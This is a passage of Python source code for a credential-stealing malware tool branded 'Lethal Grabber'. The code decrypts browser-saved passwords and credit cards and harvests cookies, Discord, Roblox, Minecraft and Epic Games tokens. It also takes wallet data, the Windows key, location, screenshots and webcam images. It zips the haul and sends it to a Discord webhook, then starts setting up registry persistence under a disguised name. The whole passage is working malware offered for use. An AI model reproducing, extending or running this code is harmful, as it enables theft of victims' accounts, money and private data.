    except:
        pass
    
    return list(roblox_cookies.keys())

def extract_chromium_passwords():
    """
    Extract all saved passwords from ALL Chromium-based browsers.
    
    Mirrors the exact methodology from the C# SHARP code:
    1. Read Local State → get os_crypt.encrypted_key
    2. Base64 decode, strip DPAPI prefix, CryptUnprotectData → master key
    3. Read Login Data DB via SQLite
    4. For each row: if password_value starts with v10/v11 → AES-256-GCM decrypt
       else → CryptUnprotectData (legacy)
    
    Returns:
        (passwords_list, scanned_browsers)
    """
    passwords = []
    scanned = []
    
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        
        # ── Step 1: Find Local State (exactly like C# SHARP) ──
        # The Local State file is ALWAYS in the User Data root, not inside a profile
        # For most browsers, base_path IS the User Data directory
        local_state_path = os.path.join(base_path, "Local State")
        
        # For browsers like Opera where base_path might be the profile dir itself
        if not os.path.exists(local_state_path):
            # Check parent
            parent = os.path.dirname(base_path)
            local_state_path = os.path.join(parent, "Local State")
        
        if not os.path.exists(local_state_path):
            continue
        
        # ── Step 2: Get AES master key (exactly like C# Decryptor.get_encryption_key) ──
        master_key = None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            # C#: local_state["os_crypt"]["encrypted_key"]
            encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
            if not encrypted_key_b64:
                # Try app_bound_encrypted_key (Chrome 127+ v20)
                app_bound = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
                if app_bound:
                    # v20 requires running as a Chrome process — complex
                    # For now, try DPAPI directly on the file
                    pass
                continue
            
            # C#: Convert.FromBase64String(encrypted_key) then strip "DPAPI" prefix
            encrypted_key = base64.b64decode(encrypted_key_b64)
            
            # C#: if key starts with "DPAPI", remove those 5 bytes
            if encrypted_key[:5] == b"DPAPI":
                encrypted_key = encrypted_key[5:]
            
            # C#: CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            if HAS_WIN32CRYPT:
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            else:
                continue
                
        except Exception as e:
            continue
        
        if not master_key:
            continue
        
        # ── Step 3: Find all profiles (like C# Browsers.RunChromiumBrowser) ──
        profiles = []
        try:
            for item in sorted(os.listdir(base_path)):
                item_path = os.path.join(base_path, item)
                if not os.path.isdir(item_path):
                    continue
                # C# checks for "Default" or "Profile*" directories
                if item == "Default" or item.startswith("Profile"):
                    profiles.append(item)
        except:
            pass
        
        if not profiles:
            profiles = ["Default"]
        
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            
            # ── Step 4: Open Login Data (like C# SQLiteHandler.GetLogins) ──
            login_db = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db):
                continue
            
            label = f"{browser_names[0]} ({profile})" if profile != 'Default' else browser_names[0]
            
            # C#: Copies file to avoid locking
            tmp_db = os.path.join(TEMP_DIR, f"lg_{uuid.uuid4().hex}.db")
            try:
                shutil.copy2(login_db, tmp_db)
            except:
                continue
            
            try:
                # C#: new SQLiteConnection("Data Source=Login Data")
                conn = sqlite3.connect(tmp_db)
                conn.text_factory = lambda b: b.decode(errors='ignore')
                cursor = conn.cursor()
                
                # C#: SELECT action_url, username_value, password_value FROM logins
                cursor.execute("PRAGMA table_info(logins)")
                columns = [row[1] for row in cursor.fetchall()]
                
                if "action_url" in columns and "username_value" in columns and "password_value" in columns:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                elif "origin_url" in columns and "username_value" in columns and "password_value" in columns:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                elif "url" in columns and "username_value" in columns and "password_value" in columns:
                    cursor.execute("SELECT url, username_value, password_value FROM logins")
                else:
                    conn.close()
                    continue
                
                rows = cursor.fetchall()
                conn.close()
                
                profile_count = 0
                for url, user, enc_pass in rows:
                    # Skip empty
                    if not url or not enc_pass:
                        continue
                    
                    # Decode URL
                    if isinstance(url, bytes):
                        url_str = url.decode('utf-8', errors='ignore')
                    else:
                        url_str = str(url)
                    
                    # Decode username
                    if isinstance(user, bytes):
                        user_str = user.decode('utf-8', errors='ignore')
                    elif user is None:
                        user_str = ""
                    else:
                        user_str = str(user)
                    
                    # ── Step 5: Decrypt password (EXACTLY like C# Decryptor.decrypt_chromium_data) ──
                    pwd_str = ""
                    if isinstance(enc_pass, bytes) and len(enc_pass) > 0:
                        try:
                            # C#: Check for v10/v11 prefix
                            if enc_pass[:3] in (b"v10", b"v11"):
                                # C#: nonce = data[3:15]  (12 bytes)
                                nonce = enc_pass[3:15]
                                # C#: ciphertext = data[15:-16]
                                ciphertext = enc_pass[15:-16]
                                # C#: tag = data[-16:] (16 bytes)
                                tag = enc_pass[-16:]
                                
                                if not ciphertext:
                                    continue
                                
                                # C#: AesGcm(key).Decrypt(nonce, ciphertext, tag, plaintext)
                                from Crypto.Cipher import AES
                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                                pwd_str = plaintext.decode('utf-8', errors='ignore')
                            
                            # C# legacy: CryptUnprotectData directly (no v10 prefix = old Chrome)
                            elif HAS_WIN32CRYPT:
                                try:
                                    plaintext = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1]
                                    pwd_str = plaintext.decode('utf-8', errors='ignore')
                                except:
                                    pass
                        except Exception:
                            pass
                    
                    if user_str and pwd_str:
                        passwords.append(
                            f"URL: {url_str}\n"
                            f"Username: {user_str}\n"
                            f"Password: {pwd_str}\n"
                            f"Browser: {label}\n"
                            f"{'='*60}"
                        )
                        profile_count += 1
                
                if profile_count > 0:
                    scanned.append(label)
                    
            except Exception as e:
                pass
            finally:
                try:
                    os.remove(tmp_db)
                except:
                    pass
    
    return passwords, scanned

def extract_chromium_autofills():
    autofills = []
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            web_db = os.path.join(profile_path, "Web Data")
            if not os.path.exists(web_db):
                continue
            try:
                tmp = os.path.join(TEMP_DIR, f"wb_{uuid.uuid4().hex}.db")
                shutil.copy2(web_db, tmp)
                conn = sqlite3.connect(tmp)
                tables = [t[0] for t in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
                if "autofill" in tables:
                    for row in conn.execute("SELECT name, value FROM autofill"):
                        autofills.append(f"Field: {row[0]}\nValue: {row[1]}\n{chr(61)*50}")
                if "autofill_profile_emails" in tables:
                    for row in conn.execute("SELECT value FROM autofill_profile_emails"):
                        autofills.append(f"Email: {row[0]}\n{chr(61)*50}")
                if "autofill_profile_phones" in tables:
                    for row in conn.execute("SELECT type, value FROM autofill_profile_phones"):
                        autofills.append(f"Phone (type {row[0]}): {row[1]}\n{chr(61)*50}")
                if "credit_cards" in tables:
                    for row in conn.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"):
                        name = row[0] or ""
                        exp = f"{row[1]}/{row[2]}" if row[1] and row[2] else ""
                        card_enc = row[3]
                        if card_enc:
                            card_dec = decrypt_chromium_value(card_enc, master_key) or b"[encrypted]"
                        else:
                            card_dec = b""
                        autofills.append(f"Credit Card: {name} | {card_dec.decode('utf-8', errors='ignore')} | Exp: {exp}\n{chr(61)*50}")
                conn.close()
                os.remove(tmp)
            except:
                try: os.remove(tmp)
                except: pass
    return autofills

def extract_all_cookies():
    all_cookies = []
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            cookies = get_cookies_from_profile(profile_path, master_key)
            for c in cookies:
                all_cookies.append(f"Host: {c['host_key']}\nName: {c['name']}\nPath: {c.get('path', '/')}\nValue: {c['decrypted_value']}\n{chr(61)*50}")
    return all_cookies

def get_minecraft_sessions():
    """
    Enhanced Minecraft launcher credential stealer.
    Targets 14+ launchers like the original Hannibal Stealer C# module.
    """
    results = []
    ROAMING = os.getenv("APPDATA", "")
    USERPROFILE = os.getenv("USERPROFILE", "")
    
    targets = {
        "Intent":         os.path.join(USERPROFILE, "intentlauncher", "launcherconfig"),
        "Lunar":          os.path.join(USERPROFILE, ".lunarclient", "settings", "game", "accounts.json"),
        "TLauncher":      os.path.join(ROAMING, ".minecraft", "TlauncherProfiles.json"),
        "Feather":        os.path.join(ROAMING, ".feather", "accounts.json"),
        "Meteor":         os.path.join(ROAMING, ".minecraft", "meteor-client", "accounts.nbt"),
        "Impact":         os.path.join(ROAMING, ".minecraft", "Impact", "alts.json"),
        "Novoline":       os.path.join(ROAMING, ".minecraft", "Novoline", "alts.novo"),
        "CheatBreakers":  os.path.join(ROAMING, ".minecraft", "cheatbreaker_accounts.json"),
        "Microsoft Store": os.path.join(ROAMING, ".minecraft", "launcher_accounts_microsoft_store.json"),
        "Rise":           os.path.join(ROAMING, ".minecraft", "Rise", "alts.txt"),
        "Rise (Intent)":  os.path.join(USERPROFILE, "intentlauncher", "Rise", "alts.txt"),
        "Paladium":       os.path.join(ROAMING, "paladium-group", "accounts.json"),
        "PolyMC":         os.path.join(ROAMING, "PolyMC", "accounts.json"),
        "Badlion":        os.path.join(ROAMING, "Badlion Client", "accounts.json"),
    }
    
    for launcher, path in targets.items():
        if os.path.isfile(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Try parsing as JSON for structured data
                try:
                    data = json.loads(content)
                    # Format nicely
                    formatted = json.dumps(data, indent=2)
                    # Truncate if massive
                    if len(formatted) > 1500:
                        formatted = formatted[:1500] + "\n... [truncated]"
                    results.append(
                        f"[{launcher}]\n"
                        f"Path: {path}\n"
                        f"Data:\n{formatted}\n"
                        f"{'='*60}"
                    )
                except json.JSONDecodeError:
                    # Plain text file (alts.txt, etc.)
                    lines = [l.strip() for l in content.split('\n') if l.strip()]
                    display = "\n".join(lines)
                    if len(display) > 1500:
                        display = display[:1500] + "\n... [truncated]"
                    results.append(
                        f"[{launcher}]\n"
                        f"Path: {path}\n"
                        f"Content:\n{display}\n"
                        f"{'='*60}"
                    )
            except Exception as e:
                results.append(f"[{launcher}] Error reading: {path} -> {str(e)}\n{'='*60}")
    
    # Also grab vanilla Minecraft launcher accounts
    mc_path = os.path.join(ROAMING, ".minecraft")
    if os.path.isdir(mc_path):
        for fname in ["launcher_accounts.json", "usercache.json", "launcher_profiles.json"]:
            fpath = os.path.join(mc_path, fname)
            if os.path.isfile(fpath):
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        data = json.load(f)
                    results.append(
                        f"[Vanilla Minecraft - {fname}]\n"
                        f"Path: {fpath}\n"
                        f"Data:\n{json.dumps(data, indent=2)[:1500]}\n"
                        f"{'='*60}"
                    )
                except:
                    pass
    
    return results

def get_epic_games_tokens():
    """
    Extract Epic Games account session tokens from the Epic Games Launcher.
    
    The launcher stores authentication data in:
      1. GameUserSettings.ini (RememberMe token / session data)
      2. Game.ini (legacy credential storage)
      3. CEF cookies DB in webcache (only when web store is used)
    """
    results = []
    epic_config_path = os.path.join(
        os.getenv("LOCALAPPDATA", ""),
        "EpicGamesLauncher", "Saved", "Config", "Windows"
    )
    
    if not os.path.isdir(epic_config_path):
        return results
    
    # ── 1. GameUserSettings.ini — main auth token storage ──
    gus_path = os.path.join(epic_config_path, "GameUserSettings.ini")
    if os.path.exists(gus_path):
        try:
            with open(gus_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Look for auth-related sections
            in_launcher = False
            launcher_data = []
            for line in content.split('\n'):
                stripped = line.strip()
                if stripped.lower().startswith('[launcher'):
                    in_launcher = True
                elif stripped.startswith('[') and in_launcher:
                    break
                elif in_launcher and stripped:
                    launcher_data.append(stripped)
            
            if launcher_data:
                results.append(
                    "Epic Games Launcher Config (GameUserSettings.ini):\n" +
                    "\n".join(launcher_data) +
                    f"\n{'='*60}"
                )
        except Exception:
            pass
    
    # ── 2. Game.ini — legacy credential storage ──
    game_ini_path = os.path.join(epic_config_path, "Game.ini")
    if os.path.exists(game_ini_path):
        try:
            with open(game_ini_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            if content.strip():
                results.append(
                    "Epic Games Legacy Config (Game.ini):\n" +
                    content.strip() +
                    f"\n{'='*60}"
                )
        except Exception:
            pass
    
    # ── 3. CEF Cookies DB — extract auth cookies via DPAPI ──
    epic_saved_path = os.path.join(os.getenv("LOCALAPPDATA", ""), "EpicGamesLauncher", "Saved")
    webcache_dirs = ["webcache", "webcache_4147", "webcache_4430"]
    
    for wc in webcache_dirs:
        cookies_path = os.path.join(epic_saved_path, wc, "Cookies")
        if not os.path.exists(cookies_path):
            continue
        
        try:
            tmp = os.path.join(TEMP_DIR, f"epic_ck_{uuid.uuid4().hex}.db")
            shutil.copy2(cookies_path, tmp)
            conn = sqlite3.connect(tmp)
            conn.text_factory = lambda b: b.decode(errors='ignore')
            
            cursor = conn.execute("PRAGMA table_info(cookies)")
            columns = [row[1] for row in cursor.fetchall()]
            
            has_encrypted = "encrypted_value" in columns
            if not has_encrypted:
                conn.close()
                os.remove(tmp)
                continue
            
            query = (
                "SELECT host_key, name, path, encrypted_value "
                "FROM cookies WHERE "
                "host_key LIKE '%epicgames.com' OR "
                "host_key LIKE '%fortnite.com' OR "
                "host_key LIKE '%unrealengine.com'"
            )
            
            for row in conn.execute(query):
                host_key, name, path, enc_val = row
                if not enc_val or len(enc_val) < 5:
                    continue
                
                cookie_value = None
                try:
                    from win32crypt import CryptUnprotectData
                    dec = CryptUnprotectData(enc_val, None, None, None, 0)[1]
                    if dec:
                        cookie_value = dec.decode('utf-8', errors='ignore')
                except Exception:
                    pass
                
                if cookie_value and len(cookie_value) > 5:
                    lower_name = name.lower()
                    lower_val = cookie_value.lower()
                    is_auth = any(kw in lower_name or kw in lower_val for kw in [
                        'token', 'auth', 'session', 'sid', 'access', 'refresh',
                        'bearer', 'exchange', 'eg1', 'egs_', 'fc_', 'adt_'
                    ])
                    
                    if is_auth or len(cookie_value) > 40:
                        results.append(
                            f"Host: {host_key}\n"
                            f"Name: {name}\n"
                            f"Path: {path}\n"
                            f"Value: {cookie_value}\n"
                            f"Source: Epic Games Launcher ({wc})\n"
                            f"{'='*60}"
                        )
            
            conn.close()
            os.remove(tmp)
        except Exception:
            try: os.remove(tmp)
            except: pass
    
    # ── 4. Account IDs from Saved/Data folder ──
    data_folder = os.path.join(epic_saved_path, "Data")
    if os.path.isdir(data_folder):
        account_ids = []
        for f in sorted(os.listdir(data_folder)):
            if f.endswith(".dat"):
                fpath = os.path.join(data_folder, f)
                try:
                    with open(fpath, 'rb') as df:
                        raw = df.read()
                    # Check if this is a readable short string (account ID)
                    text = raw.decode('utf-8', errors='ignore').strip()
                    printable_ratio = sum(1 for c in text if c.isprintable()) / max(len(text), 1)
                    if printable_ratio > 0.8 and 5 < len(text) < 80:
                        account_ids.append(f"  {f} -> {text}")
                except:
                    pass
        
        if account_ids:
            results.append(
                "Epic Games Account IDs (from Saved/Data):\n" +
                "\n".join(account_ids) +
                f"\n{'='*60}"
            )
    
    return results

def get_windows_product_key():
    """Extract Windows product key from registry."""
    try:
        import winreg
        # Try multiple registry locations
        locations = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform", "BackupProductKeyDefault"),
        ]
        
        # Try the direct key string first (Windows 10+)
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                 r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform")
            product_key, _ = winreg.QueryValueEx(key, "BackupProductKeyDefault")
            winreg.CloseKey(key)
            if product_key and len(product_key) > 10:
                return product_key.strip()
        except Exception:
            pass
        
        # Fallback: decode from DigitalProductId blob
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                             r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        dp_id = winreg.QueryValueEx(key, "DigitalProductId")[0]
        winreg.CloseKey(key)
        
        if not dp_id or len(dp_id) < 80:
            return "Could not extract"
        
        key_offset = 52
        chars = "BCDFGHJKMPQRTVWXY2346789"
        is_win8 = (dp_id[66] >> 3) & 1
        dp_id = list(dp_id)
        
        if is_win8:
            dp_id[66] = (dp_id[66] & 0xF7) | ((dp_id[66] & 0x07) << 3) | ((dp_id[66] & 0xF8) >> 3)
        
        key_bytes = dp_id[key_offset:key_offset+15]
        if len(key_bytes) < 15:
            return "Could not extract"
        
        key_str = ""
        for i in range(24, -1, -1):
            cur = 0
            for j in range(14, -1, -1):
                cur *= 256
                cur = key_bytes[j] ^ cur
                key_bytes[j] = cur // 24
                cur %= 24
            key_str = chars[cur] + key_str
        
        if is_win8 and len(key_str) > 21:
            key_str = key_str[0] + key_str[2:21] + key_str[1] + key_str[21:]
        
        result = "-".join([key_str[i:i+5] for i in range(0, min(25, len(key_str)), 5)])
        return result if len(result) > 10 else "Could not extract"
    
    except Exception:
        return "Could not extract Windows product key"

def get_system_info():
    info = {
        "PC": platform.node() or os.getenv("COMPUTERNAME", "Unknown"),
        "User": getpass.getuser(),
        "OS": platform.platform(),
        "Arch": platform.machine(),
        "IP": "Unknown",
        "HWID": uuid.UUID(int=uuid.getnode()).hex[-12:].upper(),
        "CPU": platform.processor() or "Unknown",
        "MAC": ":".join(["{:02x}".format((uuid.getnode() >> elems) & 0xff) for elems in range(5, -1, -1)]),
        "Date": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
    }
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as resp:
            info["IP"] = resp.read().decode("utf-8")
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["IP"] = s.getsockname()[0]
            s.close()
        except: pass
    return info

def take_screenshot():
    """Capture a screenshot of the primary monitor."""
    try:
        from PIL import ImageGrab
        import io
        screenshot = ImageGrab.grab()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return img_bytes
    except Exception as e:
        pass  # Screenshot failed: {e} (silenced)
        return None

def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
         passwords, autofills, cookies, scanned, roblox_cookies, minecraft_sessions,
         ff_passwords, geo_data=None, exodus_wallet_zip=None, street_address=None,
         mullvad_accounts=None, epic_games=None):
    start = time.time()
    try:
        win_key = get_windows_product_key()
        zip_filename = f"{PC_NAME}.zip"
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            if FEAT_SYSTEM:
                zf.writestr("System/system_info.json", json.dumps(sys_info, indent=4))
            if FEAT_WINKEY:
                zf.writestr("System/windows_product_key.txt", win_key)
            if passwords:
                zf.writestr("Passwords/chromium_passwords.txt", "\n".join(passwords))
            if ff_passwords:
                zf.writestr("Passwords/firefox_passwords.txt", "\n".join(ff_passwords))
            all_cookies = cookies
            if all_cookies:
                zf.writestr("Cookies/all_cookies.txt", "\n".join(all_cookies))
            if FEAT_AUTOFILLS and autofills:
                zf.writestr("Autofill/autofill_data.txt", "\n".join(autofills))
            if FEAT_MINECRAFT and minecraft_sessions:
                mc_content = "\n\n".join(minecraft_sessions)
                zf.writestr("Games/Minecraft/minecraft_accounts.txt", mc_content)
            if FEAT_EPIC_GAMES and epic_games:
                zf.writestr("Games/Epic/epic_games_tokens.txt", "\n\n".join(epic_games))
            if FEAT_ROBLOX and roblox_cookies:
                zf.writestr("Games/Roblox/roblox_cookies.txt", "\n\n".join(roblox_cookies))
            if FEAT_TOKENS and all_tokens:
                zf.writestr("Messenger/Discord/discord_tokens.txt", "\n\n".join(all_tokens))
            if FEAT_GRAB_CRYPTO:
                crypto_info = grab_crypto_wallets()
                if crypto_info:
                    zf.writestr("Crypto/crypto_wallets.txt", "\n\n".join(crypto_info))
            if exodus_wallet_zip and os.path.exists(exodus_wallet_zip):
                with open(exodus_wallet_zip, 'rb') as exf:
                    zf.writestr("Crypto/Exodus/exodus.wallet.zip", exf.read())
            if FEAT_WEBCAM:
                cam_img = capture_webcam_image()
                if cam_img and os.path.exists(cam_img):
                    with open(cam_img, 'rb') as f:
                        zf.writestr("Webcam/webcam_capture.jpg", f.read())
                    try: os.remove(cam_img)
                    except: pass
            if FEAT_GRAB_ADDRESS and street_address:
                zf.writestr("System/street_address.txt", street_address)
            if mullvad_accounts:
                zf.writestr("VPN/Mullvad/mullvad_accounts.txt", "\n\n".join(mullvad_accounts))
        zip_buffer.seek(0)
        zip_data = zip_buffer.read()
        timestamp = datetime.now(timezone.utc).isoformat()
        valid_tokens = all_tokens
        invalid_tokens = []
        has_exodus = exodus_wallet_zip is not None and os.path.exists(exodus_wallet_zip)
        desc_parts = [
            f"PC: {sys_info.get('PC','Unknown')}",
            f"User: {sys_info.get('User','Unknown')}",
            f"OS: {sys_info.get('OS','Unknown')}",
            f"IP: {sys_info.get('IP','Unknown')}",
            f"Valid Tokens: {len(valid_tokens)}",
            f"Invalid/Expired: {len(invalid_tokens)}"
        ]
        if has_exodus:
            desc_parts.append(f"Exodus Wallet: FOUND")
        if geo_data:
            city = geo_data.get('city', '?')
            region = geo_data.get('regionName', '?')
            country = geo_data.get('country', '?')
            lat = geo_data.get('lat', '?')
            lon = geo_data.get('lon', '?')
            isp = geo_data.get('isp', geo_data.get('org', '?'))
            desc_parts.append(f"Location: {city}, {region}, {country}")
            desc_parts.append(f"Coords: {lat}, {lon}")
            desc_parts.append(f"ISP: {isp}")
        if street_address and FEAT_GRAB_ADDRESS:
            desc_parts.append(f"Address: {street_address[:80]}")
        content = None
        if FEAT_PING_EVERYONE:
            content = "@everyone **New Lethal Grabber Hit!**"
        embed = {
            "title": "⚡ **Lethal Grabber** ⚡",
            "color": 0xFF1100,
            "timestamp": timestamp,
            "description": f"```css\n{chr(10).join(desc_parts)}\n```",
            "fields": [],
            "footer": {"text": f"Completed in {time.time()-start:.2f}s"}
        }
        stats = []
        if FEAT_PASSWORDS:
            stats.append(f"Passwords: {len(passwords) + len(ff_passwords)}")
        if FEAT_AUTOFILLS:
            stats.append(f"Autofills: {len(autofills)}")
        if FEAT_COOKIES:
            stats.append(f"Cookies: {len(cookies)}")
        if FEAT_TOKENS:
            stats.append(f"Tokens: {len(all_tokens)}")
        if FEAT_EPIC_GAMES:
            stats.append(f"Epic Games Tokens: {len(epic_games)}")
        embed["fields"].append({"name": "**Extraction Statistics**", "value": f"```yaml\n{chr(10).join(stats)}\n```", "inline": False})
        if has_exodus:
            embed["fields"].append({"name": "**Exodus Wallet**", "value": "```diff\n+ Exodus wallet folder found and extracted\n```", "inline": False})
        if street_address and FEAT_GRAB_ADDRESS:
            embed["fields"].append({
                "name": "**Street Address**",
                "value": f"```yaml\n{street_address}\n```",
                "inline": False
            })
        if valid_tokens:
            first = valid_tokens[0]
            lines = first.split('\n')
            clean_lines = []
            for line in lines:
                line = line.strip()
                if not line or line.startswith('=') or line.startswith('Gift Codes'):
                    continue
                clean_lines.append(line)
            embed["fields"].append({"name": "**Primary Discord Account**", "value": f"```nim\n{chr(10).join(clean_lines)}\n```", "inline": False})
            try:
                for line in clean_lines:
                    if line.startswith('Token:'):
                        token = line.replace('Token:', '').strip()
                        hdrs = {"Authorization": token}
                        r = requests.get("https://discord.com/api/v10/users/@me", headers=hdrs, timeout=5)
                        if r.status_code == 200:
                            u = r.json()
                            uid = u.get('id', '')
                            avatar_hash = u.get('avatar', '')
                            if uid and avatar_hash:
                                avatar_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar_hash}.png?size=256"
                                embed["thumbnail"] = {"url": avatar_url}
                        break
            except:
                pass
        
        # ── Roblox section ──
        if FEAT_ROBLOX and roblox_cookies:
            try:
                first_cookie = roblox_cookies[0]
                headers = {
                    "Cookie": f".ROBLOSECURITY={first_cookie}",
                    "Accept": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                rbx_resp = requests.get(
                    "https://users.roblox.com/v1/users/authenticated",
                    headers=headers,
                    timeout=10
                )
                if rbx_resp.status_code == 200:
                    rbx_data = rbx_resp.json()
                    rbx_id = rbx_data.get('id', '')
                    rbx_name = rbx_data.get('name', '')
                    rbx_display = rbx_data.get('displayName', '')
                    
                    # Get premium status
                    premium = "Unknown"
                    try:
                        prem_r = requests.get(
                            f"https://premiumfeatures.roblox.com/v1/users/{rbx_id}/validate-membership",
                            headers=headers,
                            timeout=5
                        )
                        if prem_r.status_code == 200:
                            premium = "Yes" if prem_r.json() else "No"
                    except:
                        pass
                    
                    # Get robux
                    robux = "Unknown"
                    try:
                        eco_r = requests.get(
                            f"https://economy.roblox.com/v1/users/{rbx_id}/currency",
                            headers=headers,
                            timeout=5
                        )
                        if eco_r.status_code == 200:
                            robux = str(eco_r.json().get("robux", "Unknown"))
                    except:
                        pass
                    
                    # Get creation date
                    created = "Unknown"
                    try:
                        extra_r = requests.get(
                            f"https://users.roblox.com/v1/users/{rbx_id}",
                            headers=headers,
                            timeout=5
                        )
                        if extra_r.status_code == 200:
                            created = extra_r.json().get('created', 'Unknown')
                    except:
                        pass
                    
                    # Get avatar thumbnail URL (small size for thumbnail)
                    avatar_img_url = None
                    try:
                        thumb_r = requests.get(
                            f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={rbx_id}&size=150x150&format=Png&isCircular=false",
                            headers=headers,
                            timeout=5
                        )
                        if thumb_r.status_code == 200:
                            thumb_data = thumb_r.json()
                            if thumb_data.get('data') and len(thumb_data['data']) > 0:
                                avatar_img_url = thumb_data['data'][0].get('imageUrl', '')
                    except:
                        pass
                    
                    if not avatar_img_url:
                        try:
                            avatar_img_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={rbx_id}&width=150&height=150&format=png"
                        except:
                            pass
                    
                    rbx_info = [
                        f"Username: {rbx_name}",
                        f"Display Name: {rbx_display}",
                        f"User ID: {rbx_id}",
                        f"Robux: {robux}",
                        f"Premium: {premium}",
                        f"Created: {created}",
                        f"Cookie: Active ({len(first_cookie)} chars)"
                    ]
                    
                    embed["fields"].append({
                        "name": "**Roblox Account**",
                        "value": f"```yaml\n{chr(10).join(rbx_info)}\n```",
                        "inline": False
                    })
                    
                    # Use thumbnail instead of image - much smaller display
                    if avatar_img_url:
                        embed["thumbnail"] = {"url": avatar_img_url}
                else:
                    embed["fields"].append({
                        "name": "**Roblox Account**",
                        "value": f"```yaml\nCookie found but INVALID ({rbx_resp.status_code})\nCookie length: {len(first_cookie)} chars\n```",
                        "inline": False
                    })
            except Exception as e:
                embed["fields"].append({
                    "name": "**Roblox Account**",
                    "value": f"```yaml\nError validating cookie: {str(e)[:80]}\n```",
                    "inline": False
                })
        
        # ── Remaining embed fields ──
        items = []
        if street_address and FEAT_GRAB_ADDRESS:
            items.append("+ Street Address")
        if FEAT_PASSWORDS and (passwords or ff_passwords):
            items.append(f"+ Passwords ({len(passwords) + len(ff_passwords)} entries)")
        if FEAT_AUTOFILLS and autofills:
            items.append(f"+ Autofills ({len(autofills)} entries)")
        if FEAT_COOKIES and cookies:
            items.append(f"+ Cookies ({len(cookies)} entries)")
        if FEAT_TOKENS and all_tokens:
            items.append(f"+ Discord Tokens ({len(valid_tokens)} valid / {len(invalid_tokens)} expired)")
        if FEAT_WINKEY:
            items.append("+ Windows Product Key")
        if FEAT_ROBLOX and roblox_cookies:
            items.append(f"+ Roblox Cookies ({len(roblox_cookies)} found)")
        if FEAT_MINECRAFT and minecraft_sessions:
            items.append(f"+ Minecraft Sessions ({len(minecraft_sessions)} found)")
        if has_exodus:
            items.append("+ Exodus Wallet Folder")
        if items:
            embed["fields"].append({"name": f"**Collection Complete - {zip_filename}**", "value": f"```diff\n{chr(10).join(items)}\n```", "inline": False})
        if scanned:
            embed["fields"].append({"name": "**Browsers Scanned**", "value": f"```\n{', '.join(scanned)}\n```", "inline": False})
        payload = {
            "username": webhook_name or "Lethal Grabber",
            "avatar_url": webhook_avatar or "",
            "content": content or "",
            "embeds": [embed],
            "attachments": [{"id": "0", "filename": zip_filename, "description": "Collected data"}]
        }
        files = {"payload_json": (None, json.dumps(payload)), "files[0]": (zip_filename, zip_data, "application/zip")}
        try:
            r = requests.post(webhook_url, files=files, timeout=30)
            if r.status_code in (200, 204):
                return True
        except:
            pass
        try:
            r2 = requests.post(webhook_url, json={"username": webhook_name, "avatar_url": webhook_avatar, "content": content or "", "embeds": [embed]}, timeout=30)
            return r2.status_code in (200, 204)
        except:
            return False
    except:
        return False

def setup_persistence():
    """Multi-location persistence — your friend's method."""
    if not FEAT_PERSISTENCE:
        return
    
    KEY_NAME = "SysHealthStrayX64"
    self_path = sys.executable + ' "' + os.path.abspath(sys.argv[0]) + '"'
    
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, KEY_NAME, 0, winreg.REG_SZ, self_path)
        winreg.CloseKey(k)
    except:
        pass
    
    if is_admin():
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
